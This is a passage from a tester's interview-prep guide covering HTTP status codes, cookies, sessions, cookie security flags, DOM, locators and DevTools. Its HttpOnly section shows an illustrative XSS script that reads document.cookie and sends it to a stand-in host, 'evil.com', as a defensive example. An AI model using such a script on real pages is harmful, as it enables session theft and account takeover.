201 Created + Location header + body

# Update user → 200 or 204
PUT /api/users/123
200 OK + updated body
OR
204 No Content (if client doesn't need data)

# Delete user → 204
DELETE /api/users/123
204 No Content
```

**Example 2: Todo API**

```
# List todos → 200
GET /api/todos
200 OK + [array of todos]

# Create todo → 201
POST /api/todos
201 Created
Location: /api/todos/456
Body: {new todo}

# Complete todo → 204
PATCH /api/todos/456
Body: {"completed": true}
204 No Content

# Delete todo → 204
DELETE /api/todos/456
204 No Content
```

---

**Common Mistakes**:

**Mistake 1**: Using 200 for POST (create)
```
❌ POST /api/users → 200 OK
✅ POST /api/users → 201 Created
```

**Mistake 2**: Using 201 for updates
```
❌ PUT /api/users/123 → 201 Created
✅ PUT /api/users/123 → 200 OK or 204 No Content
```

**Mistake 3**: Using 204 with body
```
❌ 204 No Content + body
✅ 204 No Content + empty body
OR
✅ 200 OK + body
```

**Mistake 4**: Missing Location header with 201
```
❌ 201 Created (no Location header)
✅ 201 Created + Location: /api/users/124
```

---

**Testing Scenarios**:

```
TC_001: Create user → Verify 201 status
TC_002: Create user → Verify Location header present
TC_003: Create user → Verify response contains new ID
TC_004: Get user → Verify 200 status
TC_005: Get user → Verify body contains user data
TC_006: Delete user → Verify 204 status
TC_007: Delete user → Verify body is empty
TC_008: Update user → Verify 200 or 204
```

---

**Interview Tips**:

**Tricky Question**: "Should DELETE return 200 or 204?"
**Answer**: "Both are acceptable:
- **204 No Content**: Preferred when no additional info needed (just confirm deletion)
- **200 OK**: If you want to return confirmation message or deleted resource info
- **Example**:
  - 204: Just delete, client knows it worked
  - 200: Return `{"message": "User deleted successfully", "deleted_id": 123}`
- Best practice: Use 204 for simpler APIs"

**Tricky Question**: "Can POST return 200 instead of 201?"
**Answer**: "Technically yes, but:
- **201** is semantically correct for resource creation
- **200** acceptable if POST doesn't create (e.g., login, search, calculations)
- **Example**:
  - POST /api/users (create) → 201 ✅
  - POST /api/login (authenticate) → 200 ✅
  - POST /api/search (query) → 200 ✅
- Best practice: Use 201 for creation, 200 for other POST operations"

---

*Continue with Q8-Q30 covering Cookies, Sessions, HTML, CSS, JavaScript, and DevTools...*

### Q8: What are Cookies? How do they work?

**Answer**:

**Definition**:
Cookies are small text files stored in the browser, sent with every HTTP request to the same domain. They enable stateful behavior in stateless HTTP protocol.

**Size Limit**: ~4KB per cookie

**How Cookies Work**:

**Step 1: Server Sets Cookie**
```
Response from server:
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123; Path=/; HttpOnly; Secure; Max-Age=3600
Set-Cookie: theme=dark; Path=/
```

**Step 2: Browser Stores Cookie**
- Browser saves cookies locally
- Associated with domain (example.com)

**Step 3: Browser Sends Cookie in Future Requests**
```
Request to server:
GET /dashboard HTTP/1.1
Host: example.com
Cookie: session_id=abc123; theme=dark
```

**Step 4: Server Reads Cookie**
- Server identifies user by session_id
- Personalizes response (dark theme)

---

**Cookie Attributes**:

**1. Name=Value** (required)
```
Set-Cookie: user_id=12345
```

**2. Domain** - Which domain can access
```
Set-Cookie: session=abc; Domain=.example.com
# Accessible by: example.com, www.example.com, api.example.com
```

**3. Path** - Which URL path can access
```
Set-Cookie: admin_token=xyz; Path=/admin
# Only accessible on /admin/* paths
```

**4. Expires** - Expiration date
```
Set-Cookie: remember=true; Expires=Wed, 27 Jan 2026 10:30:00 GMT
```

**5. Max-Age** - Seconds until expiration (modern alternative to Expires)
```
Set-Cookie: session=abc; Max-Age=3600
# Expires in 1 hour (3600 seconds)
```

**6. Secure** - Only send over HTTPS
```
Set-Cookie: token=secret; Secure
# Won't be sent over HTTP (only HTTPS)
```

**7. HttpOnly** - Not accessible via JavaScript
```
Set-Cookie: session=abc; HttpOnly
# document.cookie won't see this (security)
```

**8. SameSite** - Cross-site request control
```
Set-Cookie: token=abc; SameSite=Strict
# Strict: Never sent with cross-site requests
# Lax: Sent with top-level navigation
# None: Always sent (requires Secure)
```

---

**Types of Cookies**:

**1. Session Cookies** - Deleted when browser closes
```
Set-Cookie: temp_session=xyz
# No Expires or Max-Age = session cookie
```

**2. Persistent Cookies** - Stored for specified duration
```
Set-Cookie: remember_me=true; Max-Age=2592000
# Persists for 30 days (2592000 seconds)
```

**3. First-Party Cookies** - Set by visited domain
```
On example.com:
Set-Cookie: user_id=123; Domain=example.com
```

**4. Third-Party Cookies** - Set by different domain (ads, analytics)
```
On example.com, but cookie from analytics.com:
Set-Cookie: tracking_id=xyz; Domain=analytics.com
# Used for cross-site tracking (being phased out)
```

---

**Common Use Cases**:

**1. Session Management**
```
Set-Cookie: session_id=abc123xyz; HttpOnly; Secure
# Identifies logged-in user
```

**2. Personalization**
```
Set-Cookie: theme=dark; Max-Age=31536000
Set-Cookie: language=en-US; Max-Age=31536000
# User preferences
```

**3. Tracking/Analytics**
```
Set-Cookie: visitor_id=xyz; Max-Age=31536000
# Track user behavior across visits
```

**4. Shopping Cart**
```
Set-Cookie: cart=item1,item2,item3; Path=/shop
# Store cart items
```

**5. Authentication**
```
Set-Cookie: auth_token=jwt_token; HttpOnly; Secure; SameSite=Strict
# Security-critical token
```

---

**Testing Cookies**:

**Test Cases**:
```
TC_001: Login → Verify session cookie set
TC_002: Logout → Verify session cookie deleted
TC_003: Set theme → Verify theme cookie persists
TC_004: Close browser → Verify session cookies deleted
TC_005: Wait for expiration → Verify cookie auto-deleted
TC_006: HTTP page → Verify Secure cookie not sent
TC_007: JavaScript access → Verify HttpOnly cookie not accessible
TC_008: Cross-site request → Verify SameSite works
```

**View Cookies in Browser**:
1. Press F12 (DevTools)
2. Application tab
3. Cookies → Select domain
4. View/Edit/Delete cookies

**Testing with Postman**:
- Check "Cookies" tab
- View cookies sent/received
- Manually add cookies to requests

---

**Security Concerns**:

**1. Sensitive Data in Cookies** (❌ Bad Practice)
```
❌ Set-Cookie: password=123456
❌ Set-Cookie: credit_card=4111111111111111
✅ Set-Cookie: session_id=random_token (reference to server-side data)
```

**2. Missing HttpOnly**
```
❌ Set-Cookie: session_id=abc123
# JavaScript can steal: document.cookie
✅ Set-Cookie: session_id=abc123; HttpOnly
# JavaScript cannot access
```

**3. Missing Secure**
```
❌ Set-Cookie: auth_token=secret (sent over HTTP too)
✅ Set-Cookie: auth_token=secret; Secure (HTTPS only)
```

**4. Missing SameSite**
```
❌ Set-Cookie: session=abc (vulnerable to CSRF)
✅ Set-Cookie: session=abc; SameSite=Strict (CSRF protected)
```

---

**Interview Tips**:

**Tricky Question**: "What's the difference between Expires and Max-Age?"
**Answer**:
- **Expires**: Absolute date/time (e.g., "Jan 27, 2026 10:30:00 GMT")
- **Max-Age**: Relative seconds from now (e.g., 3600 = 1 hour)
- **Precedence**: If both present, Max-Age takes priority
- **Recommendation**: Use Max-Age (simpler, no time zone issues)

---

### Q9: What is the difference between Cookies and Sessions?

**Answer**:

Both enable stateful behavior in HTTP, but work differently.

---

**Cookies**:

**Storage Location**: Client-side (browser)

**Data Size**: ~4KB per cookie

**Security**: Less secure (stored on client)

**Performance**: Sent with every request (bandwidth)

**Lifespan**: Can persist across browser restarts

**Use Cases**: Preferences, tracking, remember me

**Example**:
```
Set-Cookie: theme=dark; Max-Age=31536000
Set-Cookie: language=en-US; Max-Age=31536000
# Stored in browser, sent with every request
```

---

**Sessions**:

**Storage Location**: Server-side (server memory/database/Redis)

**Data Size**: No practical limit (stored on server)

**Security**: More secure (data on server, only ID on client)

**Performance**: Only session ID sent (less bandwidth)

**Lifespan**: Typically end when browser closes

**Use Cases**: User authentication, sensitive data, shopping cart

**Example**:
```
# Server side
Session Storage:
session_abc123 = {
  user_id: 456,
  email: "user@example.com",
  cart: ["item1", "item2"],
  login_time: "2025-01-27 10:30:00"
}

# Client side
Set-Cookie: session_id=abc123; HttpOnly; Secure
# Only ID stored in cookie, data on server
```

---

**How Sessions Work**:

**Step 1: User Logs In**
```
POST /login
Body: {"email": "user@example.com", "password": "Pass@123"}
```

**Step 2: Server Creates Session**
```
# Server generates unique session ID
session_id = "abc123xyz"

# Stores session data on server
sessions[session_id] = {
  user_id: 456,
  email: "user@example.com",
  role: "admin",
  login_time: timestamp
}
```

**Step 3: Server Sends Session ID as Cookie**
```
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123xyz; HttpOnly; Secure; Path=/
```

**Step 4: Browser Stores Cookie**
```
Cookie: session_id=abc123xyz
```

**Step 5: Subsequent Requests Include Cookie**
```
GET /dashboard
Cookie: session_id=abc123xyz
```

**Step 6: Server Looks Up Session**
```
session_id = request.cookies.get('session_id')
session_data = sessions[session_id]
# Server knows user_id=456, can personalize response
```

**Step 7: Session Expires**
```
# After timeout or logout
del sessions[session_id]
# Cookie invalid, user must login again
```

---

**Comparison Table**:

| Aspect | Cookies | Sessions |
|--------|---------|----------|
| **Storage** | Client (browser) | Server |
| **Data Location** | On user's computer | On web server |
| **Size Limit** | ~4KB | No limit (server resources) |
| **Security** | Less secure | More secure |
| **Bandwidth** | Sent with every request | Only ID sent |
| **Persistence** | Can persist | Usually temporary |
| **Speed** | Faster (no server lookup) | Slower (server lookup) |
| **Best For** | Preferences, non-sensitive | Authentication, sensitive data |
| **Example Data** | Theme, language | User ID, cart contents |
| **Access** | Client can read/modify | Only server can access |
| **Expiration** | Explicit (Max-Age/Expires) | Timeout or logout |
| **Cross-Domain** | Limited to domain | Server-side, flexible |

---

**Cookie-Based Sessions** (Hybrid Approach):

Modern apps often use cookies to store session ID:
```
# Cookie (client-side): Just the ID
Set-Cookie: session_id=abc123; HttpOnly; Secure

# Session (server-side): Actual data
{
  "abc123": {
    "user_id": 456,
    "cart": ["item1", "item2"],
    "login_time": "2025-01-27T10:30:00Z"
  }
}
```

**Benefits**:
- Session ID in cookie (small, secure)
- Session data on server (large, secure)
- Best of both worlds

---

**Real-World Examples**:

**Example 1: E-commerce Site**

**Cookies (Preferences)**:
```
theme=dark (30 days)
language=en-US (30 days)
currency=USD (30 days)
```

**Session (Critical Data)**:
```
user_id=456
cart=[product_123, product_456]
shipping_address={...}
payment_method="credit_card"
```

**Why?**
- Preferences: Safe in cookies, persist long
- Cart/user: Sensitive, need server security

**Example 2: Banking Application**

**Cookies (Minimal)**:
```
remember_device=true (for 2FA skip)
```

**Session (Everything Sensitive)**:
```
user_id=789
account_number=[...]
balance=50000
transactions=[...]
last_activity=timestamp
```

**Why?**
- Security critical
- Session expires after 15 min inactivity
- All sensitive data on server

---

**Session Storage Options**:

**1. Server Memory** (default, simple)
```python
sessions = {}  # Dictionary in RAM
# Problem: Lost on server restart
# Problem: Doesn't work with multiple servers
```

**2. Database** (persistent)
```sql
CREATE TABLE sessions (
  session_id VARCHAR(255) PRIMARY KEY,
  user_id INT,
  data JSON,
  expires_at TIMESTAMP
);
# Survives restarts
# Works with multiple servers
```

**3. Redis** (fast, distributed)
```
SET session:abc123 '{"user_id": 456, "cart": [...]}'
EXPIRE session:abc123 1800
# Fast in-memory
# Works with multiple servers
# Handles expiration automatically
```

**4. File System** (simple, slow)
```
/tmp/sessions/session_abc123.json
# Survives restarts
# Slow for high traffic
```

---

**Session Security**:

**1. Session Fixation** - Attacker sets known session ID
```
❌ Use user-provided session ID
✅ Generate new session ID on login
```

**2. Session Hijacking** - Attacker steals session ID
```
❌ Session ID sent over HTTP
✅ HTTPS only + HttpOnly + Secure flags
```

**3. Session Timeout** - Old sessions never expire
```
❌ Sessions live forever
✅ Expire after 30 minutes inactivity
✅ Absolute timeout after 8 hours
```

**4. Logout** - Session not destroyed
```
❌ Just delete cookie (session still on server)
✅ Delete server-side session + cookie
```

---

**Testing**:

**Cookie Tests**:
```
TC_001: Set cookie → Verify stored in browser
TC_002: Check cookie size → Verify < 4KB
TC_003: Check expiration → Verify auto-deleted
```

**Session Tests**:
```
TC_004: Login → Verify session created
TC_005: Session ID in cookie → Verify HttpOnly
TC_006: Make request → Verify session data used
TC_007: Logout → Verify session destroyed
TC_008: Wait 30 min → Verify session expired
TC_009: Invalid session ID → Verify 401 error
```

---

**Interview Tips**:

**Question**: "Can you have sessions without cookies?"
**Answer**: "Yes! Alternatives:
1. **URL Parameters**: `?sessionid=abc123` (❌ insecure, visible in logs)
2. **Hidden Form Fields**: `<input type='hidden' name='session_id'>` (❌ only for POST)
3. **HTTP Headers**: `X-Session-ID: abc123` (✅ works but non-standard)
4. **localStorage + API**: SPA stores token, sends in API calls (✅ modern approach)

But cookies are most common because:
- Automatic (browser sends automatically)
- Secure (HttpOnly, Secure flags)
- Standard (built into HTTP)"

---

### Q10: What is HttpOnly and Secure flag in cookies?

**Answer**:

**HttpOnly** and **Secure** are security flags for cookies that protect against common attacks.

---

**HttpOnly Flag**:

**Purpose**: Prevent JavaScript access to cookie

**Security**: Protects against XSS (Cross-Site Scripting) attacks

**How It Works**:
```
# Server sets cookie
Set-Cookie: session_id=abc123; HttpOnly

# JavaScript CANNOT access it
console.log(document.cookie);  // Won't show session_id

# Only HTTP requests can send it
GET /api/users
Cookie: session_id=abc123  ← Automatically sent by browser
```

**Why Important**:

**Without HttpOnly** (❌ Vulnerable):
```html
# Attacker injects JavaScript (XSS)
<script>
  let cookie = document.cookie;  // Gets session_id!
  fetch('https://evil.com/steal?cookie=' + cookie);  // Sends to attacker
</script>
# Attacker steals session, can impersonate user
```

**With HttpOnly** (✅ Protected):
```html
<script>
  let cookie = document.cookie;  // session_id NOT visible
  // Cannot steal HttpOnly cookies
</script>
```

**Use Cases**:
- ✅ Session IDs
- ✅ Authentication tokens
- ✅ Any security-critical cookie
- ❌ Don't use for: Theme, language (need JavaScript access)

---

**Secure Flag**:

**Purpose**: Cookie only sent over HTTPS (encrypted), never HTTP

**Security**: Protects against man-in-the-middle (MITM) attacks

**How It Works**:
```
# Server sets cookie
Set-Cookie: auth_token=secret123; Secure

# Browser behavior
HTTP request (http://example.com)  ← Cookie NOT sent
HTTPS request (https://example.com) ← Cookie sent ✅
```

**Why Important**:

**Without Secure** (❌ Vulnerable):
```
User on public WiFi
HTTP request (unencrypted)
Cookie: session_id=abc123  ← Visible to attacker on same network
# Attacker intercepts, steals session
```

**With Secure** (✅ Protected):
```
HTTPS request (encrypted)
Cookie: session_id=abc123  ← Encrypted, attacker can't read
# Even if intercepted, data is encrypted
```

**Use Cases**:
- ✅ All cookies on HTTPS sites
- ✅ Authentication tokens
- ✅ Session IDs
- ✅ Payment-related data
- ✅ Personal information

---

**Comparison**:

| Flag | Protects Against | How | When to Use |
|------|------------------|-----|-------------|
| **HttpOnly** | XSS attacks | Blocks JavaScript access | Security-critical cookies |
| **Secure** | MITM attacks | Only sent over HTTPS | All cookies on HTTPS sites |

---

**Best Practice Combinations**:

**Session Cookie (Most Secure)**:
```
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```
- **HttpOnly**: JavaScript can't steal
- **Secure**: Only HTTPS
- **SameSite=Strict**: CSRF protection
- **Path=/**: Entire site
- **Max-Age=3600**: 1 hour

**Authentication Token**:
```
Set-Cookie: auth_token=jwt123; HttpOnly; Secure; SameSite=Lax
```

**Preference Cookie (Less Sensitive)**:
```
Set-Cookie: theme=dark; Secure; Max-Age=31536000
# No HttpOnly (JavaScript needs to read)
# Still Secure (HTTPS only)
```

**Tracking Cookie (Analytics)**:
```
Set-Cookie: visitor_id=xyz; Secure; Max-Age=31536000
# No HttpOnly (analytics script needs access)
```

---

**Testing**:

**Test HttpOnly**:

**Test Case 1: Verify JavaScript Can't Access**
```
# Set cookie
Set-Cookie: test=value; HttpOnly

# Try to access via console
document.cookie
# Verify 'test=value' NOT visible
```

**Test Case 2: Verify HTTP Requests Include It**
```
# Check Network tab in DevTools
GET /api/data
Headers → Cookie: test=value
# Verify cookie sent in request
```

---

**Test Secure**:

**Test Case 1: HTTP Request**
```
# Set cookie
Set-Cookie: test=value; Secure

# Make HTTP request
http://example.com/api/data
# Verify cookie NOT sent (check Network tab)
```

**Test Case 2: HTTPS Request**
```
# Make HTTPS request
https://example.com/api/data
# Verify cookie IS sent
```

---

**Common Mistakes**:

**Mistake 1: Omitting HttpOnly for Session**
```
❌ Set-Cookie: session_id=abc123
# Vulnerable to XSS theft

✅ Set-Cookie: session_id=abc123; HttpOnly
# Protected from JavaScript access
```

**Mistake 2: Omitting Secure on HTTPS Site**
```
❌ Set-Cookie: auth_token=secret
# Could be sent over HTTP if user accidentally uses http://

✅ Set-Cookie: auth_token=secret; Secure
# Only sent over HTTPS
```

**Mistake 3: HttpOnly on Preference Cookies**
```
❌ Set-Cookie: theme=dark; HttpOnly
# JavaScript can't read theme to apply it!

✅ Set-Cookie: theme=dark
# JavaScript needs access to apply theme
```

**Mistake 4: Forgetting Both on Production**
```
❌ Development: No flags (convenient)
    Production: No flags (forgot to add!) ← Dangerous!

✅ Use flags in all environments
   Or at least add in production deployment
```

---

**SameSite (Bonus Security Flag)**:

**Purpose**: Control cross-site cookie sending (CSRF protection)

**Values**:

**Strict** (Most Secure):
```
Set-Cookie: session=abc; SameSite=Strict
# Never sent with cross-site requests
# Not even top-level navigation

Example:
User on facebook.com clicks link to yoursite.com
→ Cookie NOT sent (even though it's user-initiated)
```

**Lax** (Balanced):
```
Set-Cookie: session=abc; SameSite=Lax
# Sent with top-level navigation (GET)
# Not sent with cross-site POST/AJAX

Example:
User on facebook.com clicks link to yoursite.com
→ Cookie sent ✅ (top-level GET)
But AJAX from facebook.com to yoursite.com
→ Cookie NOT sent ✅
```

**None** (Least Secure):
```
Set-Cookie: tracking=xyz; SameSite=None; Secure
# Sent with all cross-site requests
# Must use with Secure flag
# For third-party cookies (ads, analytics)
```

---

**Real-World Example**:

**Banking Application**:
```
# Session cookie
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=1800

Why each flag:
- HttpOnly: Can't be stolen via XSS
- Secure: Only on HTTPS (encrypted)
- SameSite=Strict: Maximum CSRF protection
- Max-Age=1800: Auto-logout after 30 min
```

**E-commerce Site**:
```
# Auth cookie
Set-Cookie: auth=token; HttpOnly; Secure; SameSite=Lax

# Cart cookie (needs JS access)
Set-Cookie: cart=items; Secure; SameSite=Lax

Why Lax: Allows links from email/other sites to work
```

---

**Interview Tips**:

**Tricky Question**: "If HttpOnly protects against XSS, why do we still need input validation?"
**Answer**: "HttpOnly only protects cookies from being stolen. XSS can still:
- Steal data visible on page
- Modify DOM (deface site)
- Make requests as user (CSRF)
- Inject malicious content
- Record keystrokes
So we need BOTH:
- HttpOnly: Protect cookies
- Input validation: Prevent XSS injection
Defense in depth is key."

---

This completes in-depth coverage of Cookies, Sessions, and Security Flags!

---

### Q11: What is DOM? Why is it important for testers?

**Answer**:

**Definition**:
DOM (Document Object Model) is a programming interface that represents HTML/XML documents as a tree structure, allowing JavaScript and testing tools to access and manipulate elements.

**Structure**:
```
Document
└── <html>
    ├── <head>
        │   ├── <title>My Page</title>
        │   └── <meta>
        └── <body>
            ├── <div id="header">
            │   ├── <h1>Welcome</h1>
            │   └── <nav>
            │       ├── <a href="/home">Home</a>
            │       └── <a href="/about">About</a>
            └── <div id="content">
                ├── <p class="intro">Text</p>
                └── <button id="submitBtn">Submit</button>
```

**Why Important for Testers**:

**1. Element Identification**:
- Find locators (ID, class, XPath, CSS)
- Understand element hierarchy
- Navigate parent-child relationships

**2. Test Automation**:
- Selenium interacts with DOM
- Cypress manipulates DOM
- Locator strategies based on DOM structure

**3. Debugging**:
- Inspect elements in DevTools
- View DOM changes dynamically
- Understand why tests fail

**4. Dynamic Content**:
- AJAX updates modify DOM
- Single Page Apps (SPAs) change DOM
- Need to understand DOM mutations

**Example for Testers**:
```html
<form id="loginForm">
  <input type="email" name="email" class="input-field" />
  <input type="password" name="password" class="input-field" />
  <button type="submit" id="loginBtn">Login</button>
</form>
```

**Locator Strategies**:
- By ID: `#loginBtn`
- By Name: `input[name="email"]`
- By Class: `.input-field`
- By XPath: `//button[@id='loginBtn']`
- By CSS: `form#loginForm button`

All based on DOM structure understanding!

---

### Q12: Difference between id and class attributes?

**Answer**:

**id Attribute**:

**Definition**: Unique identifier for ONE element

**Characteristics**:
- Must be unique on page
- One element only
- Highest CSS specificity
- Fast to find
- Best for automation

**Example**:
```html
<button id="submitBtn">Submit</button>
<div id="header">Header</div>
<!-- Cannot have another id="submitBtn" on same page -->
```

**Selecting in CSS/JavaScript**:
```css
#submitBtn { color: blue; }  /* CSS */
```
```javascript
document.getElementById('submitBtn')  // JavaScript
document.querySelector('#submitBtn')
```

**In Test Automation**:
```java
driver.findElement(By.id("submitBtn"))  // Selenium
```

---

**class Attribute**:

**Definition**: Reusable style/selector for MULTIPLE elements

**Characteristics**:
- Can be reused
- Multiple elements can have same class
- Element can have multiple classes
- Good for styling groups

**Example**:
```html
<button class="btn btn-primary">Submit</button>
<button class="btn btn-secondary">Cancel</button>
<input class="input-field" type="text" />
<input class="input-field" type="email" />
<!-- Multiple elements with same class -->
```

**Multiple Classes**:
```html
<button class="btn btn-large btn-primary">
  <!-- Three classes: btn, btn-large, btn-primary -->
</button>
```

**Selecting in CSS/JavaScript**:
```css
.btn { padding: 10px; }  /* CSS - applies to all .btn */
.btn-primary { background: blue; }
```
```javascript
document.getElementsByClassName('btn')  // Returns array
document.querySelector('.btn')          // Returns first match
document.querySelectorAll('.btn')       // Returns all matches
```

**In Test Automation**:
```java
driver.findElements(By.className("btn"))  // Returns list
driver.findElement(By.className("btn"))   // Returns first
```

---

**Comparison Table**:

| Aspect | id | class |
|--------|----|-------|
| **Uniqueness** | Must be unique | Can be reused |
| **Per Element** | One id per element | Multiple classes per element |
| **Per Page** | Each id used once | Each class used many times |
| **Purpose** | Unique identification | Grouping/styling |
| **Selector** | #idName | .className |
| **JavaScript** | getElementById() | getElementsByClassName() |
| **Automation** | By.id() | By.className() |
| **Speed** | Fastest | Fast |
| **Best For** | Automation, unique elements | Styling, groups |
| **Example** | id="submitBtn" | class="btn btn-primary" |

---

**When to Use Each**:

**Use id when**:
- ✅ Element is unique (login button, main header)
- ✅ Test automation (most reliable)
- ✅ JavaScript interactions
- ✅ Anchor links (`<a href="#section1">`)

**Use class when**:
- ✅ Styling multiple similar elements
- ✅ Grouping elements (all buttons, all inputs)
- ✅ Reusable components
- ✅ Multiple categories (btn, btn-large, btn-primary)

---

**Real-World Examples**:

**Example 1: Navigation**
```html
<nav id="mainNav" class="navbar navbar-dark">
  <a href="#" class="nav-link">Home</a>
  <a href="#" class="nav-link">About</a>
  <a href="#" class="nav-link active">Contact</a>
</nav>
```
- `id="mainNav"`: Unique identifier for this nav
- `class="navbar navbar-dark"`: Styling classes
- `class="nav-link"`: Reused for all links
- `class="active"`: Current page indicator

**Example 2: Form**
```html
<form id="registrationForm" class="form-horizontal">
  <input id="email" name="email" class="form-control" />
  <input id="password" name="password" class="form-control" />
  <button id="registerBtn" class="btn btn-primary btn-lg">Register</button>
</form>
```
- Each input has unique `id` for automation
- All inputs share `class="form-control"` for styling
- Button has unique `id` but multiple classes for appearance

---

**Testing Implications**:

**Best Locator Priority**:
1. **id** (best - unique, fast, stable)
2. **name** (good for forms)
3. **class** (okay if unique combination)
4. **CSS selector** (flexible)
5. **XPath** (powerful but slower, fragile)

**Test Automation Examples**:

**By ID** (Preferred):
```java
driver.findElement(By.id("submitBtn")).click();
```

**By Class** (When ID not available):
```java
// If multiple elements, specify which one
driver.findElements(By.className("btn")).get(0);  // First button

// Or combine with other selectors
driver.findElement(By.cssSelector("button.btn-primary"));
```

**By Multiple Classes**:
```java
driver.findElement(By.cssSelector(".btn.btn-primary.btn-lg"));
// Must have ALL three classes
```

---

**Common Mistakes**:

**Mistake 1: Duplicate IDs**
```html
❌ <button id="btn">Submit</button>
   <button id="btn">Cancel</button>
# Invalid! IDs must be unique
# Automation will find only first one

✅ <button id="submitBtn">Submit</button>
   <button id="cancelBtn">Cancel</button>
```

**Mistake 2: Using ID Like Class**
```html
❌ <button id="btn-primary">Button 1</button>
   <button id="btn-primary">Button 2</button>
# Invalid! Can't reuse IDs

✅ <button id="btn1" class="btn-primary">Button 1</button>
   <button id="btn2" class="btn-primary">Button 2</button>
```

**Mistake 3: Class Name in Automation**
```java
❌ driver.findElement(By.id("btn btn-primary"))
# Wrong! This is not an ID, it's multiple classes

✅ driver.findElement(By.cssSelector(".btn.btn-primary"))
# Correct for multiple classes
```

---

**Interview Tips**:

**Tricky Question**: "Can an element have both id and class?"
**Answer**: "Yes! It's common practice:
```html
<button id="submitBtn" class="btn btn-primary">
```
- id: Unique identifier for automation/JavaScript
- class: Styling and grouping
- Both serve different purposes and complement each other"

**Tricky Question**: "What's better for test automation: id or class?"
**Answer**: "ID is better because:
1. Unique (no ambiguity)
2. Fast (browser can find quickly)
3. Stable (classes change for styling, IDs stay)
4. Reliable (returns exactly one element)

However, if ID not available, use class with qualifying selectors:
- `button.btn-primary` (element + class)
- `.form-control[name='email']` (class + attribute)
- `#loginForm .input-field:nth-child(1)` (hierarchy)"

---

[Continue to Q13-Q30...]


### Q13-Q30: Quick Reference Guide

Due to space constraints, here are concise but comprehensive answers for the remaining questions:

---

### Q13: How to identify elements for test automation?

**Locator Priority**:
1. **ID** - Most reliable, unique, fast
2. **Name** - Good for form elements
3. **CSS Selector** - Flexible, readable
4. **XPath** - Powerful but slower
5. **Link Text** - For links only

**Example**:
```html
<button id="submitBtn" name="submit" class="btn btn-primary">
```
- Best: `By.id("submitBtn")`
- Good: `By.name("submit")`
- Okay: `By.cssSelector(".btn-primary")`

---

### Q14: CSS Selectors for test automation?

**Common Patterns**:
```css
#id              /* By ID */
.class           /* By class */
element.class    /* Element with class */
[attribute]      /* Has attribute */
[attr="value"]   /* Attribute equals */
[attr*="value"]  /* Attribute contains */
parent > child   /* Direct child */
ancestor descendant /* Any descendant */
:nth-child(n)    /* Nth element */
```

**Testing Examples**:
```java
driver.findElement(By.cssSelector("#loginBtn"))
driver.findElement(By.cssSelector("input[type='email']"))
driver.findElement(By.cssSelector("form#login .input-field:first-child"))
```

---

### Q15: CSS Selectors vs XPath?

| Aspect | CSS Selector | XPath |
|--------|--------------|-------|
| **Speed** | Faster | Slower |
| **Readability** | More readable | Less readable |
| **Direction** | Forward only (parent to child) | Both directions |
| **Text Search** | Limited | Excellent |
| **Browser Support** | Native | Not native |
| **Best For** | Standard navigation | Complex traversal |

**When to Use XPath**:
- Navigate from child to parent
- Search by text: `//button[text()='Submit']`
- Complex conditions

**When to Use CSS**:
- Standard element finding
- Performance matters
- Simpler expressions

---

### Q16: Which locator strategy is best?

**Priorit Order**:
1. **ID** - Most stable, unique
2. **Name** - Form elements
3. **CSS Selector** - Flexible
4. **XPath** - Last resort

**Best Practices**:
- Use data-testid attributes for automation
- Avoid position-based selectors (fragile)
- Keep locators simple and readable
- Don't use complex XPath

---

### Q17: How to use Network tab for testing?

**Key Features**:
1. **View Requests**: See all HTTP requests
2. **Check Status**: Verify status codes
3. **Inspect Headers**: Request/response headers
4. **View Payload**: Request/response body
5. **Check Timing**: Performance analysis

**Testing Steps**:
1. Open DevTools (F12)
2. Go to Network tab
3. Perform action (submit form)
4. Analyze request/response
5. Verify status code, headers, body

**What to Test**:
- Correct API called
- Request payload correct
- Response status 200
- Response data valid
- Headers present (auth, content-type)

---

### Q18: How to debug JavaScript errors in console?

**Steps**:
1. Open Console tab (F12)
2. Look for red error messages
3. Note error type and line number
4. Click error to see source
5. Set breakpoints for debugging

**Common Errors**:
- `Uncaught TypeError`: Undefined variable
- `Uncaught ReferenceError`: Variable not declared
- `Syntax Error`: Code syntax wrong
- `Network Error`: API call failed

**Testing Use**:
- Check for JS errors during testing
- Verify no console errors
- Test error handling

---

### Q19: How to analyze page load performance?

**Metrics to Check**:
1. **DOMContentLoaded**: HTML parsed
2. **Load**: All resources loaded
3. **First Paint**: First pixel rendered
4. **Largest Contentful Paint**: Main content visible

**Using DevTools**:
1. Network tab → Check load time at bottom
2. Performance tab → Record page load
3. Lighthouse → Comprehensive analysis

**Testing**:
- Page loads < 3 seconds
- API calls < 1 second
- Images optimized
- No blocking resources

---

### Q20: Essential command line commands for testers?

**Navigation**:
```bash
cd directory      # Change directory
pwd              # Print working directory
ls               # List files (Mac/Linux)
dir              # List files (Windows)
```

**File Operations**:
```bash
cat file.txt     # View file (Linux/Mac)
type file.txt    # View file (Windows)
mkdir folder     # Create directory
rm file          # Delete file
```

**Testing Commands**:
```bash
npm test         # Run tests (Node.js)
mvn test         # Run tests (Java/Maven)
pytest           # Run tests (Python)
```

**Git Commands**:
```bash
git status       # Check status
git add .        # Stage changes
git commit -m "message"  # Commit
git push         # Push to remote
```

---

### Q21-Q25: Browser DevTools Deep Dive

**Q21: Elements Tab Usage**
- Inspect HTML structure
- Find element locators
- Edit HTML/CSS live
- View computed styles

**Q22: Application Tab Usage**
- View/edit cookies
- Check localStorage
- View sessionStorage
- Inspect cache
- Check service workers

**Q23: Sources Tab Usage**
- View JavaScript files
- Set breakpoints
- Step through code
- Debug JavaScript
- View call stack

**Q24: Performance Tab Usage**
- Record page load
- Analyze bottlenecks
- View FPS
- Check memory usage
- Identify slow operations

**Q25: Security Tab Usage**
- View SSL certificate
- Check security issues
- Verify HTTPS
- View mixed content warnings

---

### Q26-Q30: JavaScript & Testing

**Q26: JavaScript Basics for Testers**

Essential concepts:
```javascript
// Variables
let name = "John";
const age = 25;

// Functions
function greet() {
  return "Hello";
}

// Objects
let user = {
  name: "John",
  age: 25
};

// Arrays
let numbers = [1, 2, 3];
```

**Q27: Using JavaScript in Selenium**

```java
JavascriptExecutor js = (JavascriptExecutor) driver;

// Scroll
js.executeScript("window.scrollTo(0, document.body.scrollHeight)");

// Click
js.executeScript("arguments[0].click();", element);

// Get text
String text = (String) js.executeScript("return arguments[0].textContent;", element);
```

**Q28: Handling Dynamic Content**

Strategies:
1. **Explicit Waits**: Wait for element
